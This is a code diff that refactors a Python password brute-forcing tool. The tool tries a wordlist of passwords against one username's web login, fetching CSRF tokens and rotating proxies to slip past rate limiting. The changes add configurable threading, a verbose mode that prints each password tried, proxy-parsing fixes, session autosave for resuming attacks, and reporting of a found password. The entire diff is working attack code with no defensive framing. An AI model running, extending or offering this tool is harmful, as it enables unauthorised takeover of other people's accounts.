@@ -43,13 +43,14 @@ class Proxy:
 
 class Bruter:
 
-    def __init__(self, username: str, wordlist: str) -> None:
+    def __init__(self, username: str, wordlist: str, threads: int, verbose: bool = False) -> None:
 
         # Consts
-        self.max_proxies = 64
-        self.max_browsers = 16  # No more than 16  # maximum browsers that can be held at once
-        self.proxies_browsers = {}  # {'proxy_sig': Proxy() }
+        self.verbose = verbose
+        self.max_proxies = threads
+        self.proxies_browsers = {}
         self.username = username.title()
+        self.max_browsers = const.MAX_ATTEMPT_PROXY
 
         # Objects
         self.display = Display()
@@ -60,8 +61,8 @@ class Bruter:
 
         # States
         self.attempts = 0
-        self.csrftoken = {}  # {'token': 'qOlrGeSn', 'last_updated': 1560564455.7405217}
         self.is_alive = True
+        self.csrftoken = None
         self.active_browsers = 0
         self.account_password = None
 
@@ -87,6 +88,7 @@ class Bruter:
             csrftoken = requests.get(
                 const.CSRFTOKEN_URL
             ).cookies.get_dict()['csrftoken']
+
         except:
             return False
 
@@ -94,8 +96,7 @@ class Bruter:
             return False
 
         with self.lock_csrftoken:
-            self.csrftoken['token'] = csrftoken
-            self.csrftoken['last_updated'] = time.time()
+            self.csrftoken = csrftoken
 
         return True
 
@@ -110,7 +111,7 @@ class Bruter:
         while self.is_alive:
 
             # Wait
-            for _ in range(const.CSRFTOKEN_DELAY * 60):
+            for _ in range(const.CSRFTOKEN_DELAY):
 
                 if not self.is_alive:
                     break
@@ -129,7 +130,7 @@ class Bruter:
             return self.csrftoken
 
     # Proxies
-    def manager_proxies(self) -> None:
+    def manage_proxies(self) -> None:
         '''Sets up proxies to be used with browsers.
         '''
 
@@ -142,7 +143,8 @@ class Bruter:
                 if not proxy:
                     break
 
-                ip, port = proxy['https'].split(':')
+                ip, port = proxy['https'].split('//')[-1].split(':')
+
                 proxy_sig = '{}:{}'.format(ip, port)
                 proxy_sig = hashlib.sha256(proxy_sig.encode()).hexdigest()
 
@@ -250,10 +252,13 @@ class Bruter:
         try:
             Thread(target=browser.login, daemon=True).start()
             self.active_browsers += 1
-            # print('[+] Trying:', password) # Remove
+
+            if self.verbose and self.is_alive:
+                with self.lock_display:
+                    print('[-] Trying: {} ...'.format(
+                        password
+                    ))
         except:
-            self.add_password(password)
-            self.active_browsers -= 1
             return
 
         try:
@@ -279,7 +284,7 @@ class Bruter:
             if not browser.is_processed:
                 browser.is_processed = True
 
-                self.add_password(browser.password)  # Uncomment not Remove
+                self.add_password(browser.password)
                 self.active_browsers -= 1
 
         return True
@@ -295,18 +300,12 @@ class Bruter:
 
         if browser.is_authenticated:
             self.account_password = browser.password
-        elif browser.password_attempted:
-            if self.attempts < self.passwords.total_lines-1:
-                self.attempts += 1
-
-                with open('p.txt', 'at') as f:  # Remove
-                    f.write('{}\n'.format(browser.password))
+        elif browser.password_attempted and not browser.proxy_failed:
+            self.attempts += 1
 
         if browser.proxy_failed:
 
-            with self.lock_proxies_browsers:
-                proxy = self.proxies_browsers[proxy_sig]
-
+            proxy = self.proxies_browsers[proxy_sig]
             self.proxies.proxy_expired(browser.proxy)
 
             proxy.is_expired = True
@@ -324,6 +323,9 @@ class Bruter:
         for browser in browsers:
 
             if not self.is_alive:
+                break
+
+            if self.proxies_browsers[proxy_sig].is_expired:
                 break
 
             time_elapsed = time.time() - browser.time_started
@@ -356,7 +358,7 @@ class Bruter:
                 self.examine_browsers(proxy_sig, browsers)
 
             self.lock_proxies_browsers.release()
-            time.sleep(0.5)
+            time.sleep(0.1)
 
     # Passwords
 
@@ -389,7 +391,8 @@ class Bruter:
         browsers = 0
         self.display.basic_info()
 
-        # return  # Remove
+        if self.verbose:
+            return
 
         while self.is_alive:
 
@@ -404,14 +407,64 @@ class Bruter:
             progress = round(progress, 2)
 
             print(
-                f'[-] Username: {self.username}  ::  Attempts: {self.attempts}  ::  Browsers: {self.active_browsers}  ::  Progress: {progress}%', end='\r'
+                f'[-] Username: {self.username}  ::  Attempts: {self.attempts:02d}  ::  Browsers: {self.active_browsers:02d}  ::  Progress: {progress}%.', end='\r'
             )
 
             time.sleep(0.1)
 
+    # Session
+    def manage_sessions(self) -> None:
+        '''Auto-save the session every n seconds.
+        '''
+
+        last_attempt = 0
+
+        while self.is_alive:
+
+            for _ in range(const.SESSION_AUTOSAVE_TIME):
+
+                if not self.is_alive:
+                    break
+
+                time.sleep(1)
+
+            if last_attempt == self.attempts or not self.is_alive:
+                time.sleep(0.1)
+                continue
+
+            last_attempt = self.attempts
+
+            with self.lock_proxies_browsers:
+                passwords = self.gather_passwords()
+
+            if self.is_alive:
+                self.passwords.session.write(
+                    self.attempts, passwords
+                )
+
+    def gather_passwords(self) -> list:
+        '''Returns a list of passwords within each browser and the local passwords list.
+        '''
+
+        passwords = deque()
+
+        for proxy_sig in list(self.proxies_browsers):
+
+            if not self.is_alive:
+                break
+
+            for browser in self.proxies_browsers[proxy_sig].browsers:
+
+                if not self.is_alive:
+                    break
+
+                passwords.append(browser.password)
+
+        return list(passwords) + list(self.local_passwords)
+
     # Shutdown
 
-    def gather_passwords(self) -> None:
+    def gather_passwords_remove(self) -> None:
         '''Iterates through browsers and adds the passwords from them into local_passwords.
         '''
 
@@ -447,7 +500,7 @@ class Bruter:
             self.write_out()
             self.display.password_found(self.account_password)
         else:
-            self.gather_passwords()
+            self.gather_passwords_remove()
 
         # Session
         if self.account_password or (not self.passwords.size() and not len(self.local_passwords)):
@@ -469,9 +522,9 @@ class Bruter:
             with self.lock_proxies_browsers:
                 proxy_sig = self.get_proxy_signature()
 
-            csrftoken_obj = self.get_csrftoken()
+            csrftoken = self.get_csrftoken()
 
-            if not proxy_sig or not csrftoken_obj or not proxy_sig in self.proxies_browsers:
+            if not proxy_sig or not csrftoken or not proxy_sig in self.proxies_browsers:
                 time.sleep(0.5)
                 continue
 
@@ -479,8 +532,6 @@ class Bruter:
                 continue
 
             password = self.local_passwords.popleft()
-            csrftoken = csrftoken_obj['token']
-
             self.create_browsers(password, proxy_sig, csrftoken)
 
     def is_done(self, n=5) -> bool:
@@ -494,15 +545,11 @@ class Bruter:
                 if len(self.proxies_browsers[proxy_sig].browsers):
                     return False
 
-        with self.lock_passwords:
-            passwords_done = self.passwords.is_done()
-
-        if self.active_browsers or not passwords_done:
+        if self.active_browsers or not self.passwords.is_done():
             return False
 
-        with self.lock_local_passwords:
-            if len(self.local_passwords):
-                return False
+        if len(self.local_passwords):
+            return False
 
         if n:
             time.sleep(0.1)
@@ -525,9 +572,6 @@ class Bruter:
 
     def start(self) -> None:
 
-        with open('p.txt', 'w') as f:  # Remove
-            pass
-
         self.display.clear()
 
         # Check if a session already exists.
@@ -549,8 +593,9 @@ class Bruter:
         core_tasks = [
             self.manage_status,
             self.manage_attacks,
+            self.manage_proxies,
             self.passwords.start,
-            self.manager_proxies,
+            self.manage_sessions,
             self.manage_browsers,
             self.manage_csrftokens,
             self.manage_local_passwords,
@@ -589,19 +634,22 @@ class Bruter:
         progress = (self.attempts / self.passwords.total_lines) * 100
         progress = round(progress, 2)
 
-        with self.lock_display:
+        if not self.verbose:
+            with self.lock_display:
 
-            self.display.primary(
-                self.username,
-                self.attempts,
-                self.active_browsers,
-                progress
-            )
+                self.display.primary(
+                    self.username,
+                    self.attempts,
+                    self.active_browsers,
+                    progress
+                )
 
         if not self.account_password:
             with self.lock_display:
                 self.display.danger('Exiting', '', '...', True)
 
         if self.attempts:
+            time.sleep(0.5)
+
             self.cleanup()
             time.sleep(1.5)
